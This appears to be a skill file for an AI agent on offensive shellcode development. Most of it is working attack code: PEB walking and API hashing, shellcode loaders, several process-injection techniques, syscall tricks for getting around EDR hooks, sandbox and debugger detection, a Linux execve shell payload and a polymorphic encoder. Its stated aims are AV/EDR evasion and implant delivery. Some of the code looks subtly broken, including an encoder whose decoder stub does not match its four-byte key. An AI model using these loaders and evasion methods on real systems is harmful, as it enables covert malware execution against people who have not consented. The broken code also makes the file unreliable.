---
name: shellcode-dev
description: Shellcode development — PIC techniques, PEB walking, API hashing, null-byte avoidance, encoders, loaders, PE-to-shellcode conversion, cross-platform shellcode
metadata:
  type: offensive
  phase: exploitation
  tools: keystone, nasm, msfvenom, donut, srdi, pwntools
kill_chain:
  phase: [weaponize]
  step: [2]
  attck_tactics: [TA0042]
depends_on: [exploit-development, coding-mastery]
feeds_into: [edr-evasion, initial-access]
inputs: [target_architecture, payload_constraints]
outputs: [shellcode, loader, injector]
---

# Shellcode Development

## When to Activate

- Writing custom x86/x64 shellcode
- Implementing position-independent code (PIC)
- Building shellcode loaders for implant delivery
- Evading AV/EDR static detection
- Converting PE files to shellcode
- Cross-platform shellcode development

## Execution Pattern (Allocate-Write-Execute)

Avoid direct `PAGE_EXECUTE_READWRITE` — prefer two-step:

```c
// 1. Allocate with RW
char *dest = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
// 2. Write shellcode
memcpy(dest, shellcode, size);
// 3. Switch to RX (no write permission)
VirtualProtect(dest, size, PAGE_EXECUTE_READ, &old);
// 4. Execute
((void(*)())dest)();
```

## Position-Independent Code (PIC)

| Method | Platform | Notes |
|--------|----------|-------|
| Call/Pop | Windows | Push next addr, pop into register |
| FPU state (fstenv) | Windows | Saves instruction pointer |
| SEH | Windows | Exception handler stores EIP |
| RIP-relative | x64 | `lea rax, [rip+offset]` |
| GOT | Linux | Global Offset Table |
| VDSO | Linux | Kernel-provided shared object |

## Windows API Resolution (PEB Walk)

```nasm
; x64 PEB walk to find kernel32.dll base
find_kernel32:
    xor rcx, rcx
    mov rax, gs:[rcx + 0x60]       ; RAX = PEB
    mov rax, [rax + 0x18]          ; RAX = PEB->Ldr
    mov rsi, [rax + 0x20]          ; RSI = InMemoryOrderModuleList
    lodsq                           ; skip first entry (exe)
    xchg rax, rsi
    lodsq                           ; skip ntdll
    mov rbx, [rax + 0x20]          ; RBX = kernel32 base address
```

### Export Address Table (EAT) Parsing

```nasm
; Parse EAT to find GetProcAddress
    mov ebx, [rbx + 0x3C]          ; PE signature offset
    add rbx, r8                     ; PE header
    mov edx, [rbx + 0x88]          ; Export Directory RVA
    add rdx, r8                     ; Export Directory VA
    mov r10d, [rdx + 0x14]         ; NumberOfFunctions
    mov r11d, [rdx + 0x20]         ; AddressOfNames RVA
    add r11, r8                     ; AddressOfNames VA
    ; Loop through names, compare hash/string
```

### API Hashing (ROR13)

```python
# Generate hash for API name
def ror13_hash(name):
    hash_val = 0
    for c in name:
        hash_val = ((hash_val >> 13) | (hash_val << 19)) & 0xFFFFFFFF
        hash_val = (hash_val + ord(c)) & 0xFFFFFFFF
    return hash_val

# Common hashes:
# GetProcAddress: 0x7c0dfcaa
# LoadLibraryA:   0xec0e4e8e
# VirtualAlloc:   0x91afca54
# CreateProcessA: 0x863fcc79
```

## Null-Byte Avoidance

| Problem | Solution |
|---------|----------|
| `mov rax, 0` | `xor rax, rax` |
| `mov eax, 0x00000001` | `xor eax, eax; inc eax` |
| String with null terminator | Push string in reverse, use stack pointer |
| `add rsp, 0x200` | `sub rsp, 0xfffffffffffffdf8` (two's complement) |
| Zero in immediate | Use `sub` from known value, or XOR encoding |

## Shellcode Loaders

### Loader Responsibilities
1. Environment verification / keying (sandbox detection)
2. Shellcode decryption (XOR, RC4, AES)
3. Safe memory allocation and injection
4. Execution transfer

### Recommended Languages
- **Zig**: Small binary, no runtime, good for loaders
- **Rust**: Memory-safe, no runtime overhead
- **Nim**: Compiles to C, small binaries
- **Go**: Cross-platform but watch for runtime signatures

### Allocation Strategies

```c
// Two-step allocation (avoid RWX)
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);

// Alternative: Section mapping
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
// Write shellcode to localView
NtMapViewOfSection(hSection, GetCurrentProcess(), &execView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
// Execute from execView
```

### Evasion Tips for Write Phase
- Prepend shellcode with dummy NOPs/garbage opcodes
- Split into chunks, write in randomized order
- Add random delays between writes
- Use `NtWriteVirtualMemory` instead of `memcpy` for remote injection

### Execution Methods

| Technique | Detection Risk | Notes |
|-----------|---------------|-------|
| CreateRemoteThread | HIGH | Heavily monitored by all EDRs |
| NtQueueApcThreadEx | MEDIUM | APC injection, less monitored |
| NtSetContextThread | MEDIUM | Hijack suspended thread context |
| Callback functions | LOW | VirtualAlloc + EnumWindows callback |
| Fiber execution | LOW | ConvertThreadToFiber + CreateFiber |
| ThreadlessInject | VERY LOW | Overwrite rarely-called export |
| Trampoline (DripLoader) | LOW | JMP to shellcode from ntdll function |

## PE-to-Shellcode Conversion

| Tool | Purpose |
|------|---------|
| [Donut](https://github.com/TheWover/donut) | EXE/DLL/VBS/JS → position-independent shellcode |
| [sRDI](https://github.com/monoxgas/sRDI) | DLL → reflective shellcode |
| [Pe2shc](https://github.com/hasherezade/pe_to_shellcode) | PE → shellcode with custom loader |
| [Amber](https://github.com/EgeBalci/amber) | Reflective PE packer with evasion |

## Shellcode Storage & Hiding

| Location | Risk | Notes |
|----------|------|-------|
| Hardcoded in .text | Medium | Requires recompile |
| PE Resources (RCDATA) | High | Most scanned by AV |
| Certificate Table | Low | Keeps PE signature intact |
| Extra PE section | Medium | Use second-to-last section |
| Internet-hosted | Variable | Downloaded at runtime |
| Registry values | Medium | Stored as binary data |
| Alternate Data Streams | Low | NTFS-specific, less scanned |

### Certificate Table Technique (Recommended)
- Pad Certificate Table with shellcode bytes
- Update PE headers to reflect new size
- Main executable signature remains valid
- Only the loader DLL signature breaks
- Protection: compress (LZMA) + encrypt (AES/RC4/XOR32) before storing

## DripLoader Pattern

```
1. Reserve 64KB chunks with NO_ACCESS
2. Allocate 4KB RW chunks within that pool
3. Write shellcode in chunks in randomized order
4. Re-protect to RX
5. Overwrite prologue of ntdll!RtlpWow64CtxFromAmd64 with JMP trampoline
6. All calls via direct syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx)
```

## Cross-Platform Considerations

### Windows on ARM64 (WoA)
- Syscalls use `SVC 0` with ARM64 syscall table
- Pointer Authentication (PAC) signs LR — avoid stack pivots or re-sign with PACIASP
- Different register conventions (x0-x7 for args, x8 for syscall number)

### Linux x64
```nasm
; execve("/bin/sh", NULL, NULL)
xor rsi, rsi
mul rsi                 ; rax=0, rdx=0
push rsi
mov rdi, 0x68732f2f6e69622f  ; /bin//sh
push rdi
push rsp
pop rdi                 ; rdi = pointer to "/bin//sh"
mov al, 59             ; syscall number for execve
syscall
```

### macOS (Apple Silicon)
- Syscall numbers offset by 0x2000000 (e.g., execve = 0x200003B)
- Code signing enforcement — unsigned code won't execute without entitlements
- Hardened runtime prevents most injection techniques

## Windows 11 24H2 Notes

- AMSI heap scanning active: allocate PAGE_NOACCESS → decrypt in place → PAGE_EXECUTE_READ
- Smart App Control blocks unsigned outbound connections
- Enhanced stack tracing checks full call chain

## Advanced: Modern Injection Techniques

### Early Bird APC Injection
```c
// Inject before process initialization — APC runs before entry point
// Avoids EDR hooks that are set up during DLL loading

STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Allocate and write shellcode
LPVOID base = VirtualAllocEx(pi.hProcess, NULL, scSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(pi.hProcess, base, shellcode, scSize, NULL);
VirtualProtectEx(pi.hProcess, base, scSize, PAGE_EXECUTE_READ, &old);

// Queue APC to main thread — executes before entry point
QueueUserAPC((PAPCFUNC)base, pi.hThread, 0);
ResumeThread(pi.hThread);
```

### Threadless Injection (Hook-Based)
```c
// No new thread created — hijack existing thread's execution flow
// Patch a function pointer or callback in target process

// 1. Find a function in target that will be called (e.g., sleep callback, timer)
// 2. Allocate shellcode in target process
// 3. Overwrite function pointer to point to shellcode
// 4. Shellcode executes when target naturally calls the function
// 5. Shellcode restores original pointer after execution

// Example: Hook NtWaitForSingleObject return in target's thread
PVOID hookAddr = GetRemoteProcAddress(hProcess, "ntdll.dll", "NtWaitForSingleObject");
// Write trampoline: execute shellcode → jmp back to original
BYTE trampoline[] = {
    0x50,                           // push rax (save)
    0x48, 0xB8, 0,0,0,0,0,0,0,0,  // mov rax, shellcode_addr
    0xFF, 0xD0,                     // call rax
    0x58,                           // pop rax (restore)
    0xE9, 0,0,0,0                  // jmp original_bytes
};
```

### Pool Party (Thread Pool Injection)
```c
// Abuse Windows Thread Pool internals for injection
// 5 variants targeting different TP structures

// Variant 1: Worker Factory (TP_WORK)
// Insert malicious TP_WORK item into target's thread pool queue
// When thread pool processes work items, shellcode executes

// Variant 2: Timer Queue
// Create timer in target process's timer queue
// Timer callback = shellcode address

// Variant 3: I/O Completion Port
// Queue completion packet to target's IOCP
// Completion callback = shellcode

// Variant 4: Wait Callback
// Register wait on an object in target process
// Signal the object → wait callback (shellcode) fires

// Variant 5: TP_ALPC
// Inject ALPC message that triggers callback in target's thread pool

// Key advantage: No CreateRemoteThread, no APC — uses existing thread pool threads
// EDR sees: legitimate thread pool activity
```

### Mockingjay (RWX Section Abuse)
```c
// Find DLLs with existing RWX sections — no VirtualAlloc/VirtualProtect needed
// msys-2.0.dll has a large RWX section by default

// 1. Find DLL with RWX section
// 2. Load it into target process (or find already loaded)
// 3. Write shellcode directly into RWX section
// 4. Execute — no memory permission changes to trigger ETW TI

// Self-injection variant:
HMODULE hMod = LoadLibraryA("msys-2.0.dll");
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
        (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
        PVOID rwx = (BYTE*)hMod + sec[i].VirtualAddress;
        memcpy(rwx, shellcode, scSize);
        ((void(*)())rwx)();
    }
}
```

### Dirty Vanity (Process Forking)
```c
// Use NtCreateProcessEx to fork current process
// Forked process inherits all memory including shellcode
// No WriteProcessMemory or VirtualAllocEx in target

// 1. Allocate and prepare shellcode in current process
// 2. Fork using NtCreateProcessEx (creates copy of address space)
// 3. Create thread in forked process at shellcode address
// Fork inherits memory layout — shellcode already present

HANDLE hFork;
NtCreateProcessEx(&hFork, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
    0, NULL, NULL, NULL, 0);
// Shellcode is already at same virtual address in fork
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hFork,
    shellcodeAddr, NULL, 0, 0, 0, 0, NULL);
```

## Advanced: Syscall Techniques

### Hell's Gate (Runtime SSN Resolution)
```c
// Resolve System Service Numbers (SSN) at runtime from ntdll
// Avoids hardcoding SSNs that change between Windows versions

// Pattern: ntdll Nt* functions start with:
// 4C 8B D1        mov r10, rcx
// B8 XX 00 00 00  mov eax, SSN  ← extract this
// 0F 05           syscall

DWORD GetSSN(PVOID funcAddr) {
    BYTE* p = (BYTE*)funcAddr;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&  // mov r10, rcx
        p[3] == 0xB8) {                                     // mov eax, imm32
        return *(DWORD*)(p + 4);
    }
    return 0;  // Hooked — need neighbor technique
}
```

### Halo's Gate (Hooked SSN Recovery)
```c
// When EDR hooks ntdll, the mov eax pattern is replaced with JMP
// Solution: look at neighboring syscall stubs (±1, ±2...) and calculate

DWORD GetSSNHalosGate(PVOID funcAddr) {
    BYTE* p = (BYTE*)funcAddr;
    // Check if function is hooked (starts with JMP instead of mov r10, rcx)
    if (p[0] == 0xE9 || p[0] == 0xFF) {
        // Walk UP to find unhooked neighbor
        for (int i = 1; i < 500; i++) {
            BYTE* neighbor = p - (i * 32);  // syscall stubs are 32 bytes apart
            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[3] == 0xB8) {
                return *(DWORD*)(neighbor + 4) + i;  // neighbor SSN + offset
            }
            // Walk DOWN
            neighbor = p + (i * 32);
            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[3] == 0xB8) {
                return *(DWORD*)(neighbor + 4) - i;  // neighbor SSN - offset
            }
        }
    }
    return *(DWORD*)(p + 4);  // Not hooked
}
```

### Tartarus' Gate (Exception-Based)
```c
// Handle case where EDR uses different hook patterns
// Some EDRs use: mov eax, SSN; jmp hook (preserving first instruction)
// Tartarus checks for: 0xB8 [SSN] 0xE9 [offset] pattern

DWORD GetSSNTartarus(PVOID funcAddr) {
    BYTE* p = (BYTE*)funcAddr;
    // Pattern: mov r10, rcx; mov eax, SSN; test [byte]; jne [hook]
    if (p[3] == 0xB8 && p[8] == 0xF6 && p[18] == 0x0F && p[19] == 0x05) {
        return *(DWORD*)(p + 4);  // SSN preserved despite hook
    }
    // Fall back to Halo's Gate
    return GetSSNHalosGate(funcAddr);
}
```

### Indirect Syscalls
```nasm
; Direct syscall: syscall instruction in your code — flagged by EDR
; Indirect syscall: jump to syscall instruction inside ntdll

; 1. Resolve SSN (Hell's/Halo's Gate)
; 2. Find syscall;ret gadget in ntdll
; 3. Set up registers, JMP to ntdll's syscall instruction

global IndirectSyscall
IndirectSyscall:
    mov r10, rcx            ; first arg
    mov eax, [rsp+28h]     ; SSN (passed as 5th arg)
    jmp qword [rsp+30h]    ; jump to syscall;ret in ntdll (6th arg)
    ; Return address on stack points back to our code
    ; But syscall instruction is inside ntdll — passes stack trace checks
```

## Advanced: Anti-Analysis & Sandbox Evasion

### Timing-Based Detection
```c
// RDTSC-based VM/debugger detection
ULONGLONG t1 = __rdtsc();
// Perform operation that's fast on bare metal, slow in VM/debugger
volatile int x = 0;
for (int i = 0; i < 100; i++) x += i;
ULONGLONG t2 = __rdtsc();
if ((t2 - t1) > 1000) return;  // Too slow — likely instrumented

// NtDelayExecution timing check
LARGE_INTEGER start, end, delay;
NtQuerySystemTime(&start);
delay.QuadPart = -10000000LL;  // 1 second
NtDelayExecution(FALSE, &delay);
NtQuerySystemTime(&end);
// If elapsed < 900ms, sandbox is fast-forwarding time
if ((end.QuadPart - start.QuadPart) < 9000000LL) return;
```

### Hardware Fingerprinting
```c
// CPUID-based detection
int cpuInfo[4];
__cpuid(cpuInfo, 0x40000000);
// Hypervisor brand: "VMwareVMware", "Microsoft Hv", "KVMKVMKVM"
char brand[13] = {0};
memcpy(brand, &cpuInfo[1], 12);
if (strstr(brand, "VMware") || strstr(brand, "Hv")) return;

// MAC address OUI check
// VMware: 00:0C:29, 00:50:56
// VirtualBox: 08:00:27
// Hyper-V: 00:15:5D

// Firmware tables (SMBIOS)
DWORD size = GetSystemFirmwareTable('RSMB', 0, NULL, 0);
BYTE* buf = malloc(size);
GetSystemFirmwareTable('RSMB', 0, buf, size);
// Check for "VMware", "VirtualBox", "QEMU" in SMBIOS strings
```

### Process Environment Checks
```c
// Check for analysis tools
const char* blacklist[] = {
    "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
    "processhacker.exe", "procmon.exe", "wireshark.exe", "fiddler.exe",
    "dnspy.exe", "pestudio.exe", "die.exe"
};
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
// Enumerate and check against blacklist

// Check loaded DLLs (sandbox hooks)
// sbiedll.dll (Sandboxie), dbghelp.dll (debugger), 
// SbieDll.dll, api_log.dll, dir_watch.dll
```

## Advanced: Metamorphic Shellcode

### Self-Modifying Code
```nasm
; Shellcode that rewrites itself on each execution
; Changes instruction encoding while preserving semantics

metamorphic_entry:
    ; Generate random key
    rdtsc
    mov ecx, eax
    
    ; XOR-encode the next block with new key
    lea rsi, [rip + payload_start]
    mov rdx, payload_size
.encode_loop:
    xor byte [rsi], cl
    ror cl, 3
    inc rsi
    dec rdx
    jnz .encode_loop
    
    ; Equivalent instruction substitution
    ; mov rax, X  →  push X; pop rax
    ; xor rax, rax → sub rax, rax
    ; add rax, 1 → inc rax
    ; Each execution uses different encoding
```

### Polymorphic Encoder
```python
import os, struct, random

def polymorphic_encode(shellcode: bytes) -> bytes:
    key = os.urandom(4)
    
    # Random decoder stub selection
    decoders = [
        # XOR decoder
        b"\xeb\x09\x5e\x31\xc9\xb1" + bytes([len(shellcode)]) + 
        b"\x80\x36" + bytes([key[0]]) + b"\x46\xe2\xfa\xeb\x05\xe8\xf2\xff\xff\xff",
        # ADD/SUB decoder
        b"\xeb\x09\x5e\x31\xc9\xb1" + bytes([len(shellcode)]) +
        b"\x80\x2e" + bytes([key[0]]) + b"\x46\xe2\xfa\xeb\x05\xe8\xf2\xff\xff\xff",
    ]
    
    decoder = random.choice(decoders)
    
    # NOP sled with random NOP equivalents
    nop_equivs = [b"\x90", b"\x40\x48", b"\x66\x90", b"\x0f\x1f\x00"]
    nops = b"".join(random.choice(nop_equivs) for _ in range(random.randint(2, 8)))
    
    # Encode payload
    encoded = bytes([b ^ key[i % 4] for i, b in enumerate(shellcode)])
    
    return nops + decoder + encoded
```
